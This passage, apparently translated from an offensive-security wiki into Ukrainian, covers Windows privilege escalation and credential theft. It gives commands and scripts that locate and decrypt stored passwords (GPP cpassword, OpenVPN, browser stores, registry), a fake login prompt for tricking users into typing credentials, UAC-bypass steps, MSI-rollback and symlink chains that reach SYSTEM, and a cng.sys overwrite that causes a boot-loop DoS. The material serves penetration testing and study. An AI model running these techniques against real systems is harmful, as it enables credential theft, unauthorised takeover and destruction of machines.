### Облікові дані хмарних сервісів
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Знайдіть файл **SiteList.xml**

### Кешований пароль GPP

Раніше була доступна функція, яка дозволяла розгортати власні облікові записи локальних адміністраторів на групі машин через Group Policy Preferences (GPP). Однак цей метод мав значні недоліки безпеки. По-перше, Group Policy Objects (GPO), що зберігалися як XML-файли в SYSVOL, були доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 із використанням загальнодоступного ключа за замовчуванням, могли бути розшифровані будь-яким автентифікованим користувачем. Це створювало серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Для зменшення цього ризику була розроблена функція, яка сканує локально кешовані файли GPP на наявність поля "cpassword", що не є порожнім. Після виявлення такого файлу функція розшифровує пароль і повертає спеціальний об'єкт PowerShell. Цей об'єкт містить відомості про GPP і розташування файлу, що допомагає виявити та усунути цю вразливість безпеки.

Виконайте пошук у `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до Vіsta)_ таких файлів:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Використання crackmapexec для отримання паролів:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Веб-конфігурація IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Приклад web.config з обліковими даними:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Облікові дані OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Журнали
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Запит облікових даних

Ви завжди можете **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що **пряме запитування** клієнта про **облікові дані** є дуже **ризикованим**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Можливі імена файлів, що містять облікові дані**

Відомі файли, які раніше містили **паролі** у **відкритому тексті** або у форматі **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Знайдіть усі запропоновані файли:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Облікові дані в Кошику

Також слід перевірити Кошик на наявність облікових даних усередині нього

Щоб **відновити паролі**, збережені кількома програмами, можна скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Усередині реєстру

**Інші можливі ключі реєстру з обліковими даними**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Слід перевірити dbs, де зберігаються паролі від **Chrome або Firefox**.\
Також перевірте історію, закладки та вибране браузерів, оскільки там можуть зберігатися **паролі**.

Інструменти для вилучення паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен компонент COM **ідентифікується через ідентифікатор класу (CLSID)**, а кожен компонент надає функціональність через один або кілька інтерфейсів, ідентифікованих за допомогою ідентифікаторів інтерфейсів (IID).

Класи та інтерфейси COM визначені в реєстрі відповідно в **HKEY\CLASSES\ROOT\CLSID** та **HKEY\CLASSES\ROOT\Interface**. Цей реєстр створюється шляхом об'єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Усередині CLSID цього реєстру можна знайти дочірній розділ реєстру **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, і значення під назвою **ThreadingModel**, яке може мати значення **Apartment** (однопотоковий), **Free** (багатопотоковий), **Both** (одно- або багатопотоковий) або **Neutral** (нейтральний щодо потоків).

![Історія браузерів - COM DLL Overwriting: Усередині CLSID цього реєстру можна знайти дочірній розділ реєстру InProcServer32, який містить значення за замовчуванням, що вказує на DLL, і значення...](<../../images/image (729).png>)

Загалом, якщо ви можете **перезаписати будь-які DLL**, які буде виконано, ви зможете **підвищити привілеї**, якщо цю DLL буде виконано від імені іншого користувача.

Щоб дізнатися, як атакувальники використовують COM Hijacking як механізм persistence, перегляньте:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Пошук загальних паролів у файлах і реєстрі**

**Пошук вмісту файлів**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Пошук файлу за певним іменем**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Пошук назв ключів і паролів у реєстрі**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Інструменти, які шукають паролі

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**, який я створив для **автоматичного виконання кожного POST-модуля metasploit, що шукає облікові дані** всередині жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять паролі, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для вилучення паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сесії**, **імена користувачів** і **паролі** кількох інструментів, які зберігають ці дані у відкритому вигляді (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Уявіть, що **процес, який працює від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) **з повним доступом**. Цей самий процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але успадковує всі відкриті handles головного процесу**.\
Тоді, якщо у вас є **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий handle до привілейованого процесу, створений** за допомогою `OpenProcess()`, і **інжектити shellcode**.\
[Прочитайте цей приклад, щоб дізнатися більше про те, **як виявити та використати цю вразливість**.](leaked-handle-exploitation.md)\
[Прочитайте [**цей інший допис**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) для повнішого пояснення того, як тестувати та зловживати іншими відкритими handles процесів і потоків, успадкованими з різними рівнями дозволів (не лише з повним доступом)].

## Імітація клієнта Named Pipe

Сегменти спільної пам’яті, які називають **pipes**, забезпечують комунікацію між процесами та передавання даних.

Windows надає функцію під назвою **Named Pipes**, яка дозволяє непов’язаним процесам обмінюватися даними, навіть через різні мережі. Це нагадує клієнт-серверну архітектуру, де ролі визначаються як **named pipe server** і **named pipe client**.

Коли **client** надсилає дані через pipe, **server**, який налаштував pipe, може **перейняти ідентичність** **client**, якщо має необхідні права **SeImpersonate**. Виявлення **привілейованого процесу**, який взаємодіє через pipe, що ви можете імітувати, створює можливість **отримати вищі привілеї**, перейнявши ідентичність цього процесу після його взаємодії зі створеним вами pipe. Інструкції з виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наведений нижче інструмент дозволяє **перехоплювати комунікацію named pipe за допомогою такого інструмента, як burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **а цей інструмент дозволяє переглядати список усіх pipes, щоб знаходити privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Віддалений запис DWORD через Telephony tapsrv до RCE

Сервіс Telephony (TapiSrv) у режимі сервера відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований client може зловжити асинхронним шляхом подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **запис 4 байтів** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, після чого отримати права адміністратора Telephony і завантажити довільну DLL як сервіс. Повний ланцюжок:

- `ClientAttach` із `pszDomainUser`, що вказує на наявний доступний для запису шлях → сервіс відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для асинхронного запису подій.
- Кожна подія записує контрольований attacker значення `InitContext` з `Initialize` у цей handle. Зареєструйте line app за допомогою `LRegisterRequestRecipient` (`Req_Func 61`), викличте `TRequestMakeCall` (`Req_Func 121`), отримайте дані через `GetAsyncEvents` (`Req_Func 0`), а потім скасуйте реєстрацію/завершіть роботу, щоб повторити детерміновані записи.
- Додайте себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, повторно підключіться, а потім викличте `GetUIDllName` із довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Детальніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть виконувати щось у Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Зловживання Protocol handler / ShellExecute через Markdown renderers

Клікабельні Markdown-посилання, передані до `ShellExecuteExW`, можуть запускати небезпечні URI handlers (`file:`, `ms-appinstaller:` або будь-яку зареєстровану scheme) і виконувати файли, контрольовані attacker, від імені поточного користувача. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Під час отримання shell від імені користувача можуть виконуватися заплановані завдання або інші процеси, які **передають credentials у командному рядку**. Наведений нижче скрипт кожні дві секунди збирає командні рядки процесів і порівнює поточний стан із попереднім, виводячи всі відмінності.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Викрадення паролів із процесів

## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Якщо ви маєте доступ до графічного інтерфейсу (через консоль або RDP), а UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені "NT\AUTHORITY SYSTEM", використовуючи непривілейованого користувача.

Це дає змогу одночасно підвищити привілеї та обійти UAC, скориставшись тією самою вразливістю. Крім того, немає потреби щось встановлювати, а бінарний файл, який використовується під час процесу, підписаний і виданий Microsoft.

Деякі з уражених систем:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Для експлуатації цієї вразливості необхідно виконати такі кроки:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Від Administrator Medium до High Integrity Level / UAC Bypass

Прочитайте це, щоб **дізнатися про Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Від довільного видалення/переміщення/перейменування папки до SYSTEM EoP

Техніка, описана [**у цьому дописі в блозі**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), з exploit code, [**доступним тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Атака загалом полягає у зловживанні функцією rollback Windows Installer для заміни легітимних файлів на malicious під час процесу видалення. Для цього атакувальнику потрібно створити **malicious MSI installer**, який використовуватиметься для захоплення папки `C:\Config.Msi`; пізніше Windows Installer використовуватиме її для зберігання rollback-файлів під час видалення інших MSI packages, причому rollback-файли буде змінено так, щоб вони містили malicious payload.

Узагальнена техніка виглядає так:

1. **Етап 1 – Підготовка до Hijack (залишити `C:\Config.Msi` порожньою)**

- Крок 1: Встановлення MSI
- Створіть `.msi`, який встановлює harmless-файл (наприклад, `dummy.txt`) у writable-папку (`TARGETDIR`).
- Позначте installer як **"UAC Compliant"**, щоб **non-admin user** міг його запустити.
- Залиште **handle** відкритим для файлу після встановлення.

- Крок 2: Початок Uninstall
- Видаліть той самий `.msi`.
- Процес uninstall починає переміщувати файли до `C:\Config.Msi` і перейменовувати їх на файли `.rbf` (rollback backups).
- **Опитуйте відкритий file handle** за допомогою `GetFinalPathNameByHandle`, щоб виявити момент, коли файл стає `C:\Config.Msi\<random>.rbf`.

- Крок 3: Custom Syncing
- `.msi` містить **custom uninstall action (`SyncOnRbfWritten`)**, яка:
- Сигналізує, коли `.rbf` записано.
- Потім **очікує** на іншу подію перед продовженням uninstall.

- Крок 4: Блокування видалення `.rbf`
- Після сигналу **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **перешкоджає його видаленню**.
- Потім **надішліть сигнал у відповідь**, щоб uninstall міг завершитися.
- Windows Installer не може видалити `.rbf`, а оскільки він не може видалити весь вміст, папку `C:\Config.Msi` не буде видалено.

- Крок 5: Ручне видалення `.rbf`
- Ви (атакувальник) вручну видаляєте файл `.rbf`.
- Тепер **`C:\Config.Msi` порожня** і готова до hijack.

> На цьому етапі **активуйте vulnerability довільного видалення папки на рівні SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 – Заміна Rollback Scripts на Malicious Scripts**

- Крок 6: Повторне створення `C:\Config.Msi` зі Weak ACLs
- Самостійно створіть папку `C:\Config.Msi` повторно.
- Встановіть **weak DACLs** (наприклад, Everyone:F) і **залиште handle відкритим** із `WRITE_DAC`.

- Крок 7: Запуск іншого Install
- Знову встановіть `.msi` із такими параметрами:
- `TARGETDIR`: Writable location.
- `ERROROUT`: Змінна, яка ініціює примусову помилку.
- Це встановлення використовуватиметься для повторного запуску **rollback**, який читає `.rbs` і `.rbf`.

- Крок 8: Моніторинг `.rbs`
- Використовуйте `ReadDirectoryChangesW` для моніторингу `C:\Config.Msi`, доки не з’явиться новий `.rbs`.
- Збережіть його filename.

- Крок 9: Sync перед Rollback
- `.msi` містить **custom install action (`SyncBeforeRollback`)**, яка:
- Сигналізує подію, коли створено `.rbs`.
- Потім **очікує** перед продовженням.

- Крок 10: Повторне застосування Weak ACL
- Після отримання події `.rbs created`:
- Windows Installer **повторно застосовує strong ACLs** до `C:\Config.Msi`.
- Але оскільки у вас все ще є handle із `WRITE_DAC`, ви можете **знову застосувати weak ACLs**.

> ACLs **перевіряються лише під час відкриття handle**, тому ви все ще можете записувати до папки.

- Крок 11: Розміщення Fake `.rbs` і `.rbf`
- Перезапишіть файл `.rbs` за допомогою **fake rollback script**, який вказує Windows:
- Відновити ваш файл `.rbf` (malicious DLL) у **privileged location** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Розмістіть ваш fake `.rbf`, що містить **malicious SYSTEM-level payload DLL**.

- Крок 12: Активація Rollback
- Надішліть сигнал події sync, щоб installer продовжив роботу.
- **Type 19 custom action (`ErrorOut`)** налаштовано на **навмисне завершення install з помилкою** у відомій точці.
- Це спричиняє **початок rollback**.

- Крок 13: SYSTEM встановлює вашу DLL
- Windows Installer:
- Читає ваш malicious `.rbs`.
- Копіює DLL із `.rbf` у target location.
- Тепер у вас є **malicious DLL у SYSTEM-loaded path**.

- Фінальний крок: Виконання SYSTEM Code
- Запустіть довірений **auto-elevated binary** (наприклад, `osk.exe`), який завантажує захоплену DLL.
- **Boom**: ваш code виконується **як SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлу до SYSTEM EoP

Основна MSI rollback technique (попередня) передбачає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, якщо ваша vulnerability дозволяє лише **довільне видалення файлів**?

Ви можете використати **внутрішні механізми NTFS**: кожна папка має прихований alternate data stream під назвою:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Цей потік зберігає **метадані індексу** папки.

Отже, якщо ви **видалите потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить усю папку** з файлової системи.

Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Навіть якщо ви викликаєте API видалення *file*, він **видаляє саму папку**.

### Від видалення вмісту папки до SYSTEM EoP
Що робити, якщо ваш primitive не дозволяє видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої атакувальником**?

1. Крок 1: Створіть приманкову папку та файл
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- oplock **призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, **oplock спрацьовує** й передає керування вашому callback.

4. Крок 4: Усередині callback oplock — перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
- Це спорожнить `folder1`, не порушуючи oplock.
- Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Варіант C: Створити **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Це спрямовано на внутрішній потік NTFS, у якому зберігаються метадані папки — його видалення видаляє папку.

5. Крок 5: Звільнення oplock
- Процес SYSTEM продовжує виконання та намагається видалити `file1.txt`.
- Але тепер через junction + symlink фактично видаляється:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Результат**: `C:\Config.Msi` видалено користувачем SYSTEM.

### Від створення довільної папки до постійного DoS

Скористайтеся примітивом, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з назвою **критичного Windows driver**, наприклад:
```
C:\Windows\System32\cng.sys
```
- Цей шлях зазвичай відповідає драйверу режиму ядра `cng.sys`.
- Якщо **заздалегідь створити його як папку**, Windows не зможе завантажити фактичний драйвер під час запуску.
- Після цього Windows намагається завантажити `cng.sys` під час запуску.
- Вона бачить папку, **не може знайти фактичний драйвер** і **аварійно завершує роботу або зупиняє завантаження**.
- **Резервного варіанта немає**, як і **можливості відновлення** без зовнішнього втручання (наприклад, відновлення завантаження або доступу до диска).

### Від привілейованих шляхів журналів/резервних копій і OM symlinks до довільного перезапису файлів / boot DoS

Коли **привілейований сервіс** записує журнали/експорти за шляхом, зчитаним із **доступної для запису конфігурації**, перенаправте цей шлях за допомогою **Object Manager symlinks + NTFS mount points**, щоб перетворити привілейований запис на довільний перезапис файлу (навіть **без** SeCreateSymbolicLinkPrivilege).

**Вимоги**
- Конфігурація, у якій зберігається цільовий шлях, доступна атакувальнику для запису (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити mount point до `\RPC Control` і OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Привілейована операція, яка записує дані за цим шляхом (журнал, експорт, звіт).

**Приклад ланцюжка**
1. Прочитайте конфігурацію, щоб отримати привілейоване розташування журналу, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без прав адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише лог (наприклад, адміністратор ініціює «надсилання тестового SMS»). Тепер запис потрапляє до `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписану ціль (за допомогою hex/PE parser), щоб підтвердити пошкодження; перезавантаження змушує Windows завантажити змінений шлях до драйвера → **boot loop DoS**. Це також узагальнюється на будь-який захищений файл, який привілейований сервіс відкриє для запису.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія існує в `C:\Windows\System32\cng.sys`, спочатку може бути здійснена спроба завантажити саме її, що робить цей файл надійною DoS-ціллю для пошкоджених даних.



## **Від High Integrity до SYSTEM**

### **Новий сервіс**

Якщо ви вже працюєте в процесі з High Integrity, **шлях до SYSTEM** може бути простим: достатньо **створити та запустити новий сервіс**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Під час створення бінарного файлу service переконайтеся, що це дійсний service або що бінарний файл достатньо швидко виконує необхідні дії, оскільки його буде завершено через 20 с, якщо це недійсний service.

### AlwaysInstallElevated

Із процесу з високою цілісністю можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** та **встановити** reverse shell за допомогою оболонки _**.msi**_.\
[Більше інформації про задіяні ключі реєстру та встановлення пакета _.msi_ наведено тут.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Якщо у вас є ці привілеї token (імовірно, ви знайдете їх у вже наявному процесі з високою цілісністю), ви зможете **відкрити майже будь-який процес** (крім protected processes) із привілеєм SeDebug, **скопіювати token** процесу та створити **довільний процес із цим token**.\
Зазвичай для цієї техніки **обирають будь-який процес, що працює як SYSTEM і має всі привілеї token** (_так, можна знайти процеси SYSTEM без усіх привілеїв token_).\
**Ви можете знайти** [**приклад коду, що виконує запропоновану техніку, тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ця техніка використовується meterpreter для ескалації в `getsystem`. Техніка полягає у **створенні pipe, а потім створенні або зловживанні service для запису в цей pipe**. Потім **server**, який створив pipe за допомогою привілею **`SeImpersonate`**, зможе **імперсонувати token** клієнта pipe (service), отримавши привілеї SYSTEM.\
Якщо ви хочете [**дізнатися більше про name pipes, прочитайте це**](#named-pipe-client-impersonation).\
Якщо ви хочете прочитати приклад [**переходу від високої цілісності до System за допомогою name pipes, прочитайте це**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **перехопити dll**, яка **завантажується** **процесом**, що працює як **SYSTEM**, ви зможете виконувати довільний код із цими дозволами. Тому Dll Hijacking також корисний для такого типу ескалації привілеїв, і, крім того, його набагато **легше виконати з процесу з високою цілісністю**, оскільки він матиме **дозволи на запис** у папки, що використовуються для завантаження dll.\
**Ви можете** [**дізнатися більше про Dll hijacking тут**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Прочитайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Найкращий інструмент для пошуку векторів локальної ескалації привілеїв Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
